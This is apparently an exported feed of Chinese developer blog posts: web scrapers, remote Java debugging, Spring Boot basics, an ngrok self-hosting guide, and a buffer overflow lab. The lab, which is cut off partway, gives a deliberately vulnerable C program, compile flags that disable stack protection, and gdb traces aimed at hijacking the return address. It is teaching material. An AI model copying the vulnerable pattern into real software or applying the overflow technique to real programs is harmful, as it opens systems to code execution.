遍历所有的城市列表集合 for index, value in enumerate(content): # 提取当前城市列表中的a标签的城市链接 item = value.xpath('/html/body/div[2]/div[3]/ul/li[' + str(index) + ']/a/@href') for city_path in item: city_url = HOST_URL + city_path print('当前城市链接：' + city_url) try: # 打开Chrome浏览器，自动化访问城市链接 browser = webdriver.Chrome() browser.get(url=city_url) # 提取城市名称、城市车牌代码、城市id city_name = browser.find_element_by_xpath('/html/body/div[4]/div[1]/a/span').text car_num_pre = browser.find_element_by_xpath('//*[@id="txtAbbr"]').text + browser.find_element_by_xpath( '//*[@id="txtInitial"]').text city_id = browser.find_element_by_xpath('//*[@id="cityId"]').get_attribute('value') print('城市名称:' + city_name + ' 车牌代码:' + car_num_pre + ' 城市id:' + city_id) # 写入文件 file.writelines("insert into city_info ('city_name','car_num_pre','city_id') " + "values ('" + city_name + "','" + car_num_pre + "','" + city_id + "');\n") # 刷新缓冲区，将缓冲区数据写入文件，防止缓冲区有大量待写入数据时突然断电造成数据丢失 file.flush() # 关闭浏览器 browser.close() except: print('获取城市信息时发生异常') continue # 关闭文件流 file.close()if __name__ == '__main__': start_time = datetime.datetime.now() # 获取城市名称、车牌代码、城市id，并写入指定的sql文件中 get_city_info("city_info.sql") end_time = datetime.datetime.now() print('总用时:' + str((end_time - start_time).seconds) + '秒') 点击运行之后就可以放心的出去玩了😋控制台这边对每个链接的访问情况做了输出，如果有异常（网络超时）可以等全部结束后单独把异常的城市再跑一边即可。最后输出的SQL文件如下图： 注： 使用WebDriver前，需要将对应平台的webdriver驱动复制到系统环境变量中。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用远程Debug来分析问题]]></title>
    <url>%2F7c9947ec%2F</url>
    <content type="text"><![CDATA[经常会遇到这样一个场景，项目部署到测试服务器上，当测试人员测出一些问题的时候，我们需要通过运行日志来查找问题并解决。但是并不是所有的问题都可以通过日志来解决的，比如要查看用户请求的变量和对象的一些信息，我们就需要通过断点来调试查看。正常的断点一般是在本地，但其实远程服务器的程序用Debug模式运行，然后本地连接上Debug端口，直接在本地打断点进行远程调试也未尝不可。 1.将jar包部署到服务器，使用debug模式运行项目，并且指定端口号为50051java -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=y -jar spring-boot-0.0.1-SNAPSHOT.jar &amp; 服务以Debug模式启动，Debug监听在5005端口1Listening for transport dt_socket at address: 5005 2.idea中添加一个Remote，主机地址和端口号写对应服务器的ip地址和Debug端口号Transport 选择Socket， Debugger mode 选择Attach 3.点击debug按钮，将会连接到远程debug端口，请求对应的接口,本地代码打上断点可以看到用户访问服务器上的接口，本地断点成功断到用户请求，然后就可以分析问题了。]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Spring Boot开发应用程序]]></title>
    <url>%2Fe31a6908%2F</url>
    <content type="text"><![CDATA[Spring Boot是一个开发框架，用来快速开发各种应用程序，目前用的最多的主要是后端服务的开发。Spring Boot使用特定的方式对Spring的模板化配置进行了简化，并且集成很多第三方库的默认配置。默认内置了Tomcat容器并且可以替换为其他容器，无需部署War文件，可以直接打成jar包独立运行。Spring Boot依赖于Spring家族的生态圈，你能想到的功能都应有尽有，总结起来就是：方便和快捷。 一、Spring Boot的主要特点 可以快速创建一个可独立运行的Spring程序 默认内置嵌入的Tomcat，不需要打包成War包依赖外部容器部署，可以直接打成jar包独立运行。 使用Maven或Gradle进行第三方库管理，并且做了简化。通过引入starter拥有Spring的全部功能，开箱即用。 支持自动配置，对很多第三方库提供默认配置，采用了“默认大于配置”的方式，可以做到零配置。 使用.yml .properties .xml对项目进行配置，通过不同的文件二级名称可以方便的在生产和开发环境切换。 从我开始使用Spring Boot时已经是1.5.6的版本了，到目前为止Spring Boot已经发布了2.0.2版本。之前比较忙，没有太多精力去记录，现在使用Spring Boot 2.0版本来记录学习过程。2.0的版本多了很多新特性，最大的亮点主要是Spring Framework 5.0的响应式编程。有关Spring Boot 2.0的新特性就不再详细的介绍，可以查阅官方文档。 二、开始使用Spring Boot使用Spring Boot到底有多简单？ 1.使用Gradle来构建一个普通的Java项目可以看到上面的App类中有一个入口main函数，在函数中打印 “Hello,World!”。点击运行就可以看到输出。接下来通过引入一个Spring Boot的依赖，实现零配置的Spring程序。 2.在项目的build.gradle文件中加入Spring Boot的web模块依赖1compile("org.springframework.boot:spring-boot-starter-web:2.0.2.RELEASE") 3.为入口类添加@SpringBootApplication注解，表示这是一个Spring Boot应用程序，然后在main函数中添加SpringApplication.run方法，传入启动类入口参数。1234567@SpringBootApplicationpublic class App &#123; public static void main(String[] args) &#123; SpringApplication.run(App.class,args); &#125;&#125; 通过以上三个步骤，就可以直接启动Spring Boot程序了。点击运行，控制台输出了启动日志，其中可以看到一条日志 Tomcat started on port(s): 8080，表示Tomcat启动完毕，默认占用的是8080端口，这是一个内嵌的Tomcat，后续可以高度定制。 为了可以在浏览器中访问到项目，我们需要添加一个控制器，并且提供访问地址和响应数据。为了方便这里直接在App类中添加,最终的App类如下所示：123456789101112131415161718/** * Spring Boot示例程序 * @author 蓝士钦 */@SpringBootApplication@Controllerpublic class App &#123; public static void main(String[] args) &#123; SpringApplication.run(App.class,args); &#125; @ResponseBody @RequestMapping("/hello") public String hello()&#123; return "Hello, Spring Boot!"; &#125;&#125; 在类上添加@Controller，表示这个类作为控制器层， 在类中添加一个方法hello，用来返回一个字符串。方法上的@RequestMapping(“/hello”)注解表示该方法可以响应用户的url请求为/hello。@responseBody注解的作用是将controller的方法返回的对象通过适当的转换器转换为指定的格式之后，写入到response对象的body区，通常用来返回JSON数据或者是XML。Spring Boot对@responseBody做了默认的配置，如果返回的是一个用户定义的对象，那么这个对象将会自动被解析成JSON输出。由于这里是字符串，所以浏览器访问这个方法时将直接输出字符串。打开浏览器输入 http://localhost:8080/hello 通过简单的3个步骤，就可以将普通的Java项目变成Web项目，通过浏览器可以直接访问到。如果返回的是用户自定义类型，在方法上面添加@ResponseBody将会以JSON的形式返回123456789@ResponseBody@RequestMapping("/info")public User info()&#123; User user = new User(); user.setName("蓝士钦"); user.setSex("男"); user.setAge(23); return user;&#125; 浏览器访问 http://localhost:8080/info 可以看到Spring Boot 默认为@ResponseBody注解添加了视图转换为JSON，开发人员可以不需要再单独配置，非常方便。然而Spring Boot的强大之处并不在这里，这才是刚刚开始。 三、使用正确的姿势创建Spring Boot项目 IntelliJ IDEA对Spring Boot的支持非常友好创建项目时选择Spring Initializ 即可创建Spring Boot项目。可以选择Maven或者Gradle来构建项目，Spring Boot目前支持Java、Kotlin、Groovy语言，这里使用Gradle来构建项目，语言选择使用Java。可以为Spring Boot项目添加第三方依赖，这些库也可以后续手动引入，目前就加一个web模块的依赖。项目构建好后可以看到如上图所示的结构。Spring Boot模板化了工程目录，无需任何配置就可以直接运行。 src/main模块下默认分为java源代码目录和resources资源目录src/main/java 用来存放Java代码resources/static/默认指定用来存放静态资源，比如images、css、js以及html等。resources/templates/表示模板目录，用来存放html模板，这里的文件资源默认需要通过控制器mvc的方式来访问。resources/application.properties是项目的配置文件。 Spring Boot默认已经帮我们做了各种配置了，可以根据需要进行单独配置，IDEA强大的静态代码分析功能可以给开发人员很智能的提示 修改了默认端口号为8000，上下文地址为/boot 在resources/static/目录下新建一个index.html，然后启动项目通过地址 http://localhost:8000/boot/index.html 即可访问到页面 Spring Boot 目前支持Thymeleaf 、Freemarker、Mustache、 Groovy Templates模板引擎。Spring Boot 很多用于api接口服务的开发，有时候也需要使用模板引擎来做渲染视图。官方不推荐使用jsp来做模板引擎，官方推荐使用 Thymeleaf来做视图模板引擎，使用前需要在build.gradle中添加Thymeleaf的依赖1compile('org.springframework.boot:spring-boot-starter-thymeleaf') Spring Boot 对Thymeleaf做了默认配置，prefix=classpath:/templates/ suffix=.html所以我们不需要在配置文件中配置，除非需要定制。在resources/templates/目录下新建模板页面 helloTpl.html12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang="en" xmlns:th="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;hello&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h2&gt;这是一个模板页面&lt;/h2&gt; &lt;div&gt; 控制器传过来的值为： &lt;span th:text="$&#123;message&#125;"&gt;&lt;/span&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; Thymeleaf模板引擎有很多便捷强大的表达式，这里只输出一个控制器传过来的message值，具体用法后续的文章再详细介绍。接下来在控制器中定义一个方法，向页面传值，并且返回一个模板名字名称helloTpl，Spring Boot会对该模板拼接上前后缀： 控制器方法将会返回 classpath:/templates/helloTpl.html12345678910111213/** * 控制器示例 * @author 蓝士钦 */@Controllerpublic class HelloController &#123; @RequestMapping("/hello") public String hello(Model model)&#123; model.addAttribute("message","Hello,World!"); return "helloTpl"; &#125;&#125; 访问页面 http://localhost:8000/boot/hello 就可以看到helloTpl模板被成功渲染输出了。 Spring Boot默认的配置文件为.properties，这种配置其实还不够简洁，现在很流行yml的配置我们可以把默认的配置文件删除，新建application.yml，Spring Boot在启动时默认会加载该配置文件。除此之外，我们本地开发的配置和测试服务器以及正式生产服务器肯定是有区别的，传统的Spring 项目从开发环境到测试环境和生产环境的切换时需要修改配置文件，一般通过注释的方式，这样很容易因为误操作导致配置文件的配置是错误的，Spring Boot为我们考虑到了这一点 为开发(dev)、测试(test)、生产（pro)环境分别建立不同的配置文件，在运行或打包时指定该配置即可。配置文件名称格式：application-自定义名称.yml在application.yml中指定加载的为dev，这样项目启动的时候就会加载application-dev.yml中的配置application.yml123spring: profiles: active: dev 在不同的配置文件中为项目设置不同的启动端口，以示区分application-dev.yml123# 开发环境server: port: 8100 application-test.yml123# 测试环境server: port: 8200 application-pro.yml123# 生产环境server: port: 8080 启动服务，项目加载application-dev.yml的开发环境配置，服务将会运行在8100端口。http://localhost:8100/info 修改配置文件application.yml 指定为测试环境。123spring: profiles: active: test 此时运行项目或者打成jar包运行时，项目将会加载测试环境的配置用Gradle build项目，将会在lib目录下生成一个jar包将jar包部署到测试环境，使用java -jar 命令直接运行1java -jar spring-boot-0.0.1-SNAPSHOT.jar 可以看到服务加载了测试环境的配置，运行在8200的端口上。 Spring Boot和传统的Spring开发相比，不需要繁琐的框架搭建配置，开发速度上有质的提升。Spring Boot还可以方便的和Hibernate与Mybatis等框架以及Redis、各种MQ集成，并且有默认的配置。开发者只需要少量的配置就可以快速使用各种框架来开发，灵活的在不同的环境切换。开发效率得到质的飞跃。 本篇文章记录Spring Boot的基本使用，行云流水的过了一遍，还有很多功能没有记录。每个功能点都写的不深，也不够详细，只是简单的使用，这里占时从宏观感受上先大致罗列，抽空再好好整理。后续我会分根据Spring Boot的不同方面，单独编写某个功能的文章来系统的记录Spring Boot的用法。]]></content>
      <categories>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编写爬虫分析商品评论内容]]></title>
    <url>%2F18296dc%2F</url>
    <content type="text"><![CDATA[最近看上一款很时尚的水杯，我要买的初衷就是因为杯子好看，但是我也很注重杯子的质量，比如是否有异味等。这款商品在淘宝上的评论有十几万条，里面掺杂着各种各样的评价，这么多评论一条一条的看显然是个笨方法，我的需求很简单，就是想马上知道这么多评论里究竟有多少人评论有异味。如果质量不过关，我马上换其他商品，这样可以节省我的购物时间。作为一只程序猿，这种体力劳动当然是要用编程来解决了，只需要写一个爬虫并且分析评论内容即可。 非常中意这款水杯，除了这几种款式还有其他的风格可以选择并且可以免费刻字，颜值已经达到了我的要求，就看质量如何了。我的目的就一个，编写程序来自动分析评论内容，得到我想要的结果，然后决定买不买。 编程的最终目的就是为了解决生活中的实际问题，让计算机代替人类去做一些重复性的工作。 在编写工具程序时，我用的最多的是Python，毋庸置疑他是目前用来编写工具程序效率最高的语言之一。Python凭借着简洁的语法和强大的第三方库，在运维、机器学习、以及自动化领域有着非常广泛的应用。 使用Python编写自动化程序有很多种方式，比如我之前用WebDriver库来控制浏览器进行自动化操作，这种方式基本上可以说是很暴力，一般的反爬虫手段对这种方法都没有很好的解决方案，因为他的的确确是真的浏览器在操作，不过WebDriver一般用来做浏览器端的自动化测试。爬虫程序一般是自己构造一个客户端去做网络请求，使用专门的库去做数据的获取和解析操作，比如XPath等。有些网页是通过ajax等方式来异步加载数据的，这时候就要分析并找出网页数据的调用接口，然后再用自己的程序去自动化调用。 通过分析淘宝的宝贝链接和评论页面的数据获取可以发现淘宝是采用异步调用数据的，返回的数据是json格式，所以这里用不到XPath，只需要调用接口并且解析json即可。 要做的步骤 编写爬虫根据宝贝链接爬取评论数据并保存到本地文件 分析评论数据里面的关键字得到感兴趣的内容 不说废话，上代码新建一个分析淘宝商品评论的工具类 taobao.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import requestsimport json# 获取商品评论def get_commodity_comments(order_url, file_name): # 获取商品评论信息，解析json数据 response_content = requests.get(order_url) response_json = json.loads(response_content.text.strip().strip('()')) # 商品评论条数 total = response_json['total'] # 当前评论所在页数 page = 1 # 当前评论所在行数 count = 0 # 打开指定文件，准备将请求到的数据写入到文件中 file = open(file_name, 'w') while count &lt; total: res = requests.get(order_url[:-1] + str(page)) page = page + 1 response_json = json.loads(res.text.strip().strip('()')) comments = response_json['comments'] if comments is None: return total for common_item in comments: file.writelines(common_item['user']['nick'] + '评论:' + common_item['content']) count = count + 1 # 关闭文件流 file.close() return total# 分析评论，统计关键字在评论里出现的次数def analysis_commodity(file_name, key): file = open(file_name, 'r') content = file.read() return content.count(key)def select_keyword_count(commodity_link, key_word): # 获取链接中的商品id order_id = commodity_link[commodity_link.find('&amp;id=') + 4:] # 根据商品id，查询评论接口 order_url = 'https://rate.taobao.com/feedRateList.htm?auctionNumId=' + order_id + '&amp;currentPageNum=1' # 获取商品评论，保存到指定文件，并且返回商品条数 total = get_commodity_comments(order_url, order_id + '.txt') # 根据关键字分析评论，得出分析结果 keyword_count = analysis_commodity(order_id + '.txt', key_word) return total, keyword_count 新建一个demo.py 用来测试刚刚写的工具类12345678910111213import taobaoif __name__ == '__main__': # 商品链接 commodity_link = 'https://detail.tmall.com/item.htm?spm=a220o.1000855.1000983.1.301635bfuvpObC&amp;id=557148927006' # 要查询的评论关键字 key_word = '有异味' # 执行查询返回结果 total, keyword_count = taobao.select_keyword_count(commodity_link, key_word) print('您选择的宝贝共有', str(total), '条评论', '其中有' + str(keyword_count), '人评论', key_word) 运行程序,程序根据商品链接中的商品id作为文件名，将评论数据写入了文件中。程序再次读入文件中的评论数据，对关键字进行统计。 通过控制台可以看到当前商品评论中有异味的有85条。然而简单的字符统计无法应对中华文化的博大精深， 有异味前面如果加个没,那就变成了没有异味这完全是相反的意思。这是一个包含关系，当前的结果里面可能包含了没有异味的评论。 这里本应该用到机器学习，但是在自然语言处理方面微软早已做了很多年了，对个人来说自己去训练数据集去理解用户的语义的成本是相当大的，TensorFlow我接触的不多，机器学习方面我可以说是一个小白，目前没有能力去写出这样一个卷积算法。不过如果就针对目前这当个词法而言却变得不那么复杂，完全可以通过程序多重判断来得出大致的结论。这里目前占时就low一点，修改关键词为没有异味再运行一次程序，然后把有异味减去没有异味，最后的结果就是有异味的评论。 可以看到没有异味的有80条评论，所以真正评论有异味的评论条数为 85-80=5 看一个商品的用户评价的时候，过多的关注正面评价一般没有多大意义，有可能很多是刷的虚假信息，但是负面评价一般是真实的用户评论，排除竞争对手的恶意评论，基本上只有用户在使用过程中遇到问题，很生气的情况下才会特意来对商品进行负面的评论，所以当喜欢一个商品要购买时，就尽可能多的在负面评论中参考，看看自己对这个东西的喜欢是否打过他的缺点。 经过统计，在122650条评论中只有5个人说杯子有异味，所以三个字 买买买！]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建ngrok服务器]]></title>
    <url>%2F38f11925%2F</url>
    <content type="text"><![CDATA[在开发的时候难免会遇到一些特殊场景，比如需要在测试服务器上进行远程调试。为了方便我们将工程使用Debug模式部署在测试服务器上，然后本地可以进行远程断点调试。但是这样做还是不够方便，比如开发者本地新增或者修改了代码，就没法实时进行远程断点调试了。目前比较好的方案就是把开发者自己的电脑当做测试服务器，搭建一个属于自己的ngrok服务器，实现内网穿透，外网通过绑定的域名进行访问，开发者就可以直接在本机进行需要域名才能调试的开发任务，比如微信开发。 很早之前在做微信开发的时候，我就已经在自己的Linux服务器上搭建好了ngrok，由于我自己使用的是苹果笔记本，所以ngrok编译的版本也是针对MacOS系统的，以前以为不会用到Windows系统，就没有编译，结果在工作中使用的是Windows系统。由于习惯了MacOS的开发环境和强大的触控板，在Windows上的我各种不适应。原本几分钟搞定的事搞了大半天。 为了后续开发方便，接下来我通过编译ngrok源码生成Windows版本的可执行程序。 准备工作 Git GoLang 一台拥有公网ip的服务器 一个绑定到公网ip服务器上的域名 Git和Golang的下载和安装很简单，不再阐述。这里顺便再安利一波GoLang，之前学过go，感觉在携程方面确实很强大。运行效率可以和C语言媲美，很适合系统编程（目前很火的区块链大多数用go写），开发效率也很快。还有真正的跨平台，这里从编译ngrok源码就可以看出来，go写的程序可以编译成目前主流平台的可执行程序。 好了，接下来步入正题。 步骤 下载ngrok源码 1git clone https://github.com/inconshreveable/ngrok.git 生成证书 (依次执行如下命令) 1234567export NGROK_DOMAIN="mac.lanshiqin.com"cd ngrokopenssl genrsa -out rootCA.key 2048openssl req -x509 -new -nodes -key rootCA.key -subj "/CN=$NGROK_DOMAIN" -days 5000 -out rootCA.pemopenssl genrsa -out server.key 2048openssl req -new -key server.key -subj "/CN=$NGROK_DOMAIN" -out server.csropenssl x509 -req -in server.csr -CA rootCA.pem -CAkey rootCA.key -CAcreateserial -out server.crt -days 5000 上面 NGROK_DOMAIN的 值为自己的域名 将生成的客户端和服务端证书拷贝到对应资源目录下（这一步很重要）123cp rootCA.pem assets/client/tls/ngrokroot.crt cp server.crt assets/server/tls/snakeoil.crt cp server.key assets/server/tls/snakeoil.key 编译ngrok服务端（我的服务器是linux系统，所以这里指定编译成linux平台的可执行程序） 1234#32位Linux系统GOOS=linux GOARCH=386 make release-server#64位Linux系统GOOS=linux GOARCH=amd64 make release-server 编译ngrok客户端Mac版本 1GOOS=darwin GOARCH=amd64 make release-client Windows版本1GOOS=windows GOARCH=amd64 make release-client 编译之后，在ngrok源码的bin目录下生成了对应不同平台的ngrok可执行程序 为了启动方便，新建一个ngrok.cfg配置文件12server_addr: &quot;mac.lanshiqin.com:4443&quot;trust_host_root_certs: false 为Windows平台新建一个startup.bat文件123@echo oncd %cd%ngrok -config=ngrok.cfg -log=ngrok.log -subdomain=mac 9000 ngrok服务端启动1./ngrokd -domain="lanshiqin.com" -httpAddr=":80" &amp; 启动MacOS上的ngrok客户端(最后的端口号为本地端口号，可以指定为其他任意端口)1./ngrok -config=./ngrok.cfg -subdomain=mac 9000 发现成功连接上ngrok服务器，这时外网就可以通过访问域名 http://mac.lanshiqin.com 来访问本机了 发现成功连接上ngrok服务器。我们本机9000端口运行一个程序，通过 http://mac.lanshiqin.com 域名访问来验证一下ngrok服务是否可用 发现外网可以通过域名访问到本机对应端口上的服务，到此私人ngrok服务搭建完毕。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[缓冲区溢出攻击实验]]></title>
    <url>%2Fe2f22ec7%2F</url>
    <content type="text"><![CDATA[缓冲区溢出是指向程序缓冲区写入超出预分配固定长度数据的情况。这一漏洞可以被攻击者利用来改变程序的流程控制，甚至执行代码的任意片段。缓冲区溢出攻击成为远程攻击的主要手段，攻击者利用缓冲区溢出漏洞可以植入并且执行任意的攻击代码，缓冲区溢出漏洞给予了攻击者想要的一切，甚至得到被攻击计算机的控制权。 缓冲区溢出漏洞能够被利用的主要原因是计算机采用了“冯·诺依曼体系结构”，该体系结构把程序指令也当做数据来对待，指令和数据不加区分混合存储在同一个存储器中，数据和程序在内存中是没有区别的,它们都是内存中的数据,当EIP指针指向哪 CPU就加载那段内存中的数据。这就造成数据存在覆盖指令的情况，如果数据指向一个内存地址并且覆盖了EIP指针所指向的地址，那么程序就会跳转到攻击者指定的代码段执行。 概念部分：计算机程序被CPU执行前需要先被载入内存，程序所在的内存由操作系统进行分配，程序内部使用的变量或者接收用户输入的数据都需要分配内存，这块内存区域也叫做缓冲区，程序被载入到内存后的结构如下图绿色区域所示：一个程序占用着一块内存区域，这块区域包含了程序函数的调用栈，数据，缓冲区等。如果向缓冲区写入超出长度的数据，那么数据将会覆盖到程序的其他内存区域，如果函数调用栈里某个函数地址被覆盖成其他函数地址，那么这个程序执行流程将会被改变，将会执行覆盖数据指定地址的函数。更为严重的是如果被植入精心构造的恶意代码并执行，攻击者将会得到运行该程序的用户权限，如果该程序以root角色执行，那么攻击者就可以得到目标计算机的完全控制权。 要做的事： 用C语言编写一个具有缓冲区溢出漏洞的程序，程序的功能是从main函数参数接收用户输入的数据，并且输出到控制台。 使用gcc将源代码编译成32位的可执行程序，并使用gdb调试并断点分析程序运行。 运行程序并向程序输入超过缓冲区大小的数据，对第二步调试分析得到的目标函数地址进行覆盖，将函数地址覆盖成另一个函数地址，使程序执行其他函数。 使用的系统和工具： Ubuntu Linux 16.04（64位）操作系统 vim,gcc,gdb,gcc-multilib(32位程序所需的编译工具)其中gcc和gdb在Ubuntu中已经内置，vim和编译32位程序所需的gcc编译器需要另外安装12sudo apt-get install vimsudo apt-get install gcc-multilib 实验部分：使用vim新建一个main.c 源代码文件12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;string.h&gt;void hello()&#123; printf("hello\n");&#125;int fun(char *str)&#123; char buf[10]; strcpy(buf, str); printf("%s\n", buf); return 0;&#125;int main(int argc, char **argv)&#123; char *str = argv[1]; fun(str); return 0;&#125; 上面的代码通过main()函数参数接收用户输入数据，并调用fun()函数将输入的数据str拷贝给buf缓冲区，最后将buf缓冲区的字符输出。可以看到上面的代码定义了一个字符数组为10个字节大小的buf缓冲区，并使用strcpy将str数据直接拷贝到buf缓冲区，并没有对数据长度进行判断，如果用户输入了超过10个字符的数据，那么将会产生缓冲区溢出。 上面的代码并没有调用函数hello(),我们可以利用缓冲区漏洞，让程序调用函数hello()。使用gcc将源代码编译成可执行程序1gcc -m32 -z execstack -fno-stack-protector -g -o main main.c 为了方便实验进行，上面的gcc编译指令后面跟了一些编译参数： -m32 将程序编译成32位程序 -z execstack 允许栈执行 -fno-stack-protector 关闭gcc的Stack Guard -g 为了gdb程序能够调试程序（方便后续的结合源代码断点调试） -o 输出目标文件为指定文件 编译后可以看到已经生成了可执行程序 main, 输入命令运行程序 并且后面跟上参数AAAA1./main AAAA 可以看到控制台成功输出了输入的AAAA 如果用户输入超过长度的字符，发现程序执行后会报段错误 接下来使用gdb调试目标程序1gdb ./main 在gdb模式下,可以使用disass命令查看程序中各个函数的汇编代码依次查看程序中的 hello()函数 fun()函数 main()函数的汇编代码 汇编代码如下所示:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657(gdb) disass helloDump of assembler code for function hello: 0x0804843b &lt;+0&gt;: push %ebp 0x0804843c &lt;+1&gt;: mov %esp,%ebp 0x0804843e &lt;+3&gt;: sub $0x8,%esp 0x08048441 &lt;+6&gt;: sub $0xc,%esp 0x08048444 &lt;+9&gt;: push $0x8048540 0x08048449 &lt;+14&gt;: call 0x8048310 &lt;puts@plt&gt; 0x0804844e &lt;+19&gt;: add $0x10,%esp 0x08048451 &lt;+22&gt;: nop 0x08048452 &lt;+23&gt;: leave 0x08048453 &lt;+24&gt;: ret End of assembler dump.(gdb) disass funDump of assembler code for function fun: 0x08048454 &lt;+0&gt;: push %ebp 0x08048455 &lt;+1&gt;: mov %esp,%ebp 0x08048457 &lt;+3&gt;: sub $0x18,%esp 0x0804845a &lt;+6&gt;: sub $0x8,%esp 0x0804845d &lt;+9&gt;: pushl 0x8(%ebp) 0x08048460 &lt;+12&gt;: lea -0x12(%ebp),%eax 0x08048463 &lt;+15&gt;: push %eax 0x08048464 &lt;+16&gt;: call 0x8048300 &lt;strcpy@plt&gt; 0x08048469 &lt;+21&gt;: add $0x10,%esp 0x0804846c &lt;+24&gt;: sub $0xc,%esp 0x0804846f &lt;+27&gt;: lea -0x12(%ebp),%eax 0x08048472 &lt;+30&gt;: push %eax 0x08048473 &lt;+31&gt;: call 0x8048310 &lt;puts@plt&gt; 0x08048478 &lt;+36&gt;: add $0x10,%esp 0x0804847b &lt;+39&gt;: mov $0x0,%eax 0x08048480 &lt;+44&gt;: leave 0x08048481 &lt;+45&gt;: ret End of assembler dump.(gdb) disass mainDump of assembler code for function main: 0x08048482 &lt;+0&gt;: lea 0x4(%esp),%ecx 0x08048486 &lt;+4&gt;: and $0xfffffff0,%esp 0x08048489 &lt;+7&gt;: pushl -0x4(%ecx) 0x0804848c &lt;+10&gt;: push %ebp 0x0804848d &lt;+11&gt;: mov %esp,%ebp 0x0804848f &lt;+13&gt;: push %ecx 0x08048490 &lt;+14&gt;: sub $0x14,%esp 0x08048493 &lt;+17&gt;: mov %ecx,%eax 0x08048495 &lt;+19&gt;: mov 0x4(%eax),%eax 0x08048498 &lt;+22&gt;: mov 0x4(%eax),%eax 0x0804849b &lt;+25&gt;: mov %eax,-0xc(%ebp) 0x0804849e &lt;+28&gt;: sub $0xc,%esp 0x080484a1 &lt;+31&gt;: pushl -0xc(%ebp) 0x080484a4 &lt;+34&gt;: call 0x8048454 &lt;fun&gt; 0x080484a9 &lt;+39&gt;: add $0x10,%esp 0x080484ac &lt;+42&gt;: mov $0x0,%eax 0x080484b1 &lt;+47&gt;: mov -0x4(%ebp),%ecx 0x080484b4 &lt;+50&gt;: leave 0x080484b5 &lt;+51&gt;: lea -0x4(%ecx),%esp 0x080484b8 &lt;+54&gt;: ret End of assembler dump.(gdb) 可以看到其中hello函数的首地址是 0x0804843b，缓冲区溢出的时候会用到0x0804843b。除此之外还可以看到main函数调用fun函数call的地址是0x080484a4,call后的下面一条指令地址是0x080484a9，这些指令地址都将会放在CPU寄存器里，待会断点调试的时候可以看到。 输入l命令列出程序源码：123456789101112131415161718192021(gdb) l5 &#123;6 printf("hello\n");7 &#125;8 9 int fun(char *str)10 &#123;11 char buf[10];12 strcpy(buf, str);13 printf("%s\n", buf);14 return 0;(gdb) 15 &#125;16 17 int main(int argc, char **argv)18 &#123;19 char *str = argv[1];20 fun(str);21 return 0;22 &#125;(gdb) 使用 b命令进行断点，我们将断点设置在13行和20行，看看调用fun函数时和printf输出时寄存器内的数据。12345(gdb) b 13Breakpoint 1 at 0x804846c: file main.c, line 13.(gdb) b 20Breakpoint 2 at 0x804849e: file main.c, line 20.(gdb) 输入数据AAAA运行，查看寄存器ebp和esp的数据:1234567891011(gdb) r AAAAStarting program: /home/lanshiqin/桌面/main AAAABreakpoint 2, main (argc=2, argv=0xffffd084) at main.c:2020 fun(str);(gdb) x/x $ebp0xffffcfd8: 0x00000000(gdb) x/8x $esp0xffffcfc0: 0x00000002 0xffffd084 0xffffd090 0xffffd2890xffffcfd0: 0xf7fb83dc 0xffffcff0 0x00000000 0xf7e20637(gdb) 可以看到程序先执行到了fun函数所在的断点位置，此时fun函数接收的参数str应该是输入的数据AAAA使用p命令查看str的地址123(gdb) p str$1 = 0xffffd289 "AAAA"(gdb) 使用si命令单步运行，然后查看寄存器数据1234567891011(gdb) si0x080484a1 20 fun(str);(gdb) x/8x $esp0xffffcfb4: 0x00000001 0xf7e36830 0x0804850b 0x000000020xffffcfc4: 0xffffd084 0xffffd090 0xffffd289 0xf7fb83dc(gdb) si0x080484a4 20 fun(str);(gdb) x/8x $esp0xffffcfb0: 0xffffd289 0x00000001 0xf7e36830 0x0804850b0xffffcfc0: 0x00000002 0xffffd084 0xffffd090 0xffffd289(gdb) 可以看到str地址`0xffffd289’已经压入栈中继续si单步运行，查看寄存器数据 1234567(gdb) sifun (str=0xffffd289 "AAAA") at main.c:1010 &#123;(gdb) x/8x $esp0xffffcfac: 0x080484a9 0xffffd289 0x00000001 0xf7e368300xffffcfbc: 0x0804850b 0x00000002 0xffffd084 0xffffd090(gdb) 可以看到call后面的一条指令地址0x080484a9也已经压入栈中使用n单步运行，到达13行断点位置，查看寄存器内容12345678910(gdb) n12 strcpy(buf, str);(gdb) nBreakpoint 1, fun (str=0xffffd289 "AAAA") at main.c:1313 printf("%s\n", buf);(gdb) x/8x $esp0xffffcf90: 0xffffffff 0x4141002f 0xf7004141 0xf7fd41a80xffffcfa0: 0x00008000 0xf7fb8000 0xffffcfd8 0x080484a9(gdb) 可以看到寄存器中有4个41，因为A的ASCII码对应的就是41，我们传入4个A就会有4个41。 在命令行中输入14个A重新运行，然后再次到达13行断点位置，查看寄存器内容为了方便操作，这里使用perl语言输出数据配合运行123456789101112131415(gdb) r `perl -e 'print "A"x14'`The program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /home/lanshiqin/桌面/main `perl -e 'print "A"x14'`Breakpoint 2, main (argc=2, argv=0xffffd084) at main.c:2020 fun(str);(gdb) nBreakpoint 1, fun (str=0xffffd27f 'A' &lt;repeats 14 times&gt;) at main.c:1313 printf("%s\n", buf);(gdb) x/8x $esp0xffffcf90: 0xffffffff 0x4141002f 0x41414141 0x414141410xffffcfa0: 0x41414141 0xf7fb8000 0xffffcfd8 0x080484a9(gdb) 